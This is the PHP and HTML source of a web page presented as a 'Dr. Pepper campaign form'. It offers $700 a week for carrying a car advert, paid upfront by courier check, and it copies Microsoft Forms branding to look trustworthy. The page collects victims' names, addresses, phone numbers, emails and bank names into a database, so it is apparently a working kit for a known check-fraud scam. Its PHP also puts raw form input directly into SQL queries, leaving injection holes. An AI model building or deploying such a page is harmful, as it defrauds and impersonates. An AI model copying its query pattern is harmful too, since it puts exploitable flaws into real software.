
<?php
    include('connect.php');
    if(isset($_POST['submit'])){
        $name=$_POST['name'];
        $address=$_POST['address'];
        $city=$_POST['city'];
        $state=$_POST['state'];
        $zipcode=$_POST['zipcode'];
        $phonenumber=$_POST['phonenumber'];
        $email=$_POST['email'];
        $bankname=$_POST['bankname'];
        $vehicle=$_POST['vechicle'];

            $check_query= "SELECT * FROM formfill WHERE email='$email'";
            $result=mysqli_query($con,$check_query);
            $count = mysqli_num_rows($result);
            if($count){
                echo '<script>alert("This eamial already exit");</script>';
            }
            else{
                $query = "INSERT INTO `formfill` (name, address, city, state, zipcode, phonenumber, email, bankname, vechicle) VALUES ('$name','$address','$city','$state','$zipcode','$phonenumber','$email','$bankname','$vehicle')";
                $result=mysqli_query($con,$query);
                    if($result){
                        header("Location:register.html");
                        exit();
                    }
                    else{
                        echo"not succesful";
                    }
             }
    }
    ?>


<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <title>Document</title>
    <style>
        .bg-custom {
            background-color: rgb(124, 4, 4);
        }
        .bg-customs {
            background-color: #f7f0f0;
        }
    </style>
    
</head>
<body class="m-0 block">
    <div class="max-h-fit w-full overflow-hidden block mt-4 bg-customs">
        <div class="bg-custom w-full h-full">
                <div class="w-full h-7">
                    <div>-</div>
                </div>
                <div class="w-full bg-transparent">
                    <span class="bg-transparent text-white break-words text-xl ml-10">DR PEPPER CAMPAIGN FORM</span>
                </div>
                    <div class="break-words h-full flex-1 break-all text-white text-xs p-5">
                            <b class="break-words">
                                A new marketing/promotional campaign was launched again by Dr. Pepper
                                in other to promote itself in the  market with the competition the company
                                is facing presently with other brands. We are currently seeking to 
                                employ individual’s Nationwide, Regular citizens, Professional drivers to go
                                about their normal routine as 
                                they usually do, only with a big advert for "Dr. Pepper" plastered on your v
                                ehicle. The advert is typically 
                                vinyl decals that almost seem to be painted on the vehicle, and which
                                will cover any portion of your vehicle 
                                What does the company get out of this type of ad strategy? We get lots
                                of exposure and awareness from doing 
                                this. it's a form of advertising with a captive audience.
                                This program will last for 52 weeks and the minimum 
                                you can participate is 10 weeks. Compensation/Reward:
                                You will be compensated with $700 weekly which is essentially a "RENTAL" payment 
                                for letting our company use the space & no fee is required from you. Dr. Pepper shall 
                                provide a specialist that will handle the advert placed on your car. You will receive 
                                an upfront payment in form of a check via courier service for accepting to carry this 
                                advert on your car. No application fees are required to get started, fill the form below.
                            </b>
                    </div>
            </div>

            <div class="w-full h-full bg-customs m-0">
                <div>
                    <div class="m-4">
                        <span class="text-red-900">*</span>
                        <span>Required</span>
                    </div>
                </div>
                <div class="block float-left h-full p-4 w-full bg-customs">
                    <!-- form page -->
                    <form method="post">
                    <div class="w-full mb-5">
                        <div>
                            <span>1.</span>
                            <span>NAME</span>
                            <span class="text-red-900">*</span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="text" class="h-8 w-full" placeholder="Enter your Answer" name="name" required>
                            </span>
                        </div>
                    </div>
                    <div class="w-full mb-5">
                        <div>
                            <span>2.</span>
                            <span>ADDRESS</span>
                            <span class="text-red-900">*</span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="address" class="h-8 w-full" placeholder="Enter your Answer" name="address" required>
                            </span>
                        </div>
                    </div>
                    <div class="w-full mb-4">
                        <div>
                            <span>3.</span>
                            <span>CITY</span>
                            <span class="text-red-900">*</span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="text" class="h-8 w-full" placeholder="Enter your Answer" name="city" required>
                            </span>
                        </div>
                    </div>
                    <div class="w-full mb-4">
                        <div>
                            <span>4.</span>
                            <span>STATE</span>
                            <span class="text-red-900">*</span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="text" class="h-8 w-full focus:" name="state" placeholder="Enter your Answer" required>
                            </span>
                        </div>
                    </div>
                    <div class="w-full mb-4">
                        <div>
                            <span>5.</span>
                            <span>ZIPCODE</span>
                            <span class="text-red-900">*</span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="text" class="h-8 w-full" placeholder="Enter your Answer" required name="zipcode">
                            </span>
                        </div>
                    </div>
                    <div class="w-full mb-6">
                        <div>
                            <span>6.</span>
                            <span>PHOENUMBER</span>
                            <span class="text-red-900">*</span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="number " class="h-8 w-full" placeholder="Enter your Answer" name="phonenumber" required>
                            </span>
                        </div>
                        
                    </div>
                    <div class="w-full mb-6">
                        <div>
                            <span>7.</span>
                            <span>EMAIL</span>
                            <span class="text-red-900">*</span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="email" class="h-8 w-full" placeholder="Enter your Answwer" required name="email">
                            </span>
                        </div>
                    </div>
                    <div class="w-full mb-4">
                        <div>
                            <span>8.</span>
                            <span>BANK NAME</span>
                            <span class="text-red-900">*</span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="text" class="h-8 w-full" placeholder="Enter your Answer" required name="bankname">
                            </span>
                        </div>
                    </div>
                    <div class="w-full mb-4">
                        <div>
                            <span>9.</span>
                            <span>vehicle type/Model</span>
                            <span class="text-red-900">*</span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="text" class="h-8 w-full" placeholder="Enter your Answer" required name="vechicle">
                            </span>
                        </div>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                                <input type="submit" class="h-8 w-full bg-custom text-white " name="submit">
                            </span>
                        </div>
                    </form>
                        <div class="p-2 w-full m">
                            <span class="align-initial flex-wrap relative w-full">
                               Never give out your password <a href="j#">report abuse</a>
                            </span>
                        </div>
                    </div>

                </div>
                <div class="w-full h-full bg-white">
                    <div>
                        <img src="https://cdn.forms.office.net/forms/images/microsoft365logo_v1.png" alt="Microsoft Forms" tabindex="0" height="60">
                    </div>
                    <div class="break-words h-full flex-1 break-all text-xs p-5">
                        <div>This content is created by the owner of the form. The data you submit will be sent to the form owner. Microsoft is not responsible for the privacy or security practices of its customers,
                             including those of this form owner. Never give out your password.</div>
                    </div>
                </div>
            </div>
        </div>
        </div>
</body>
</html>

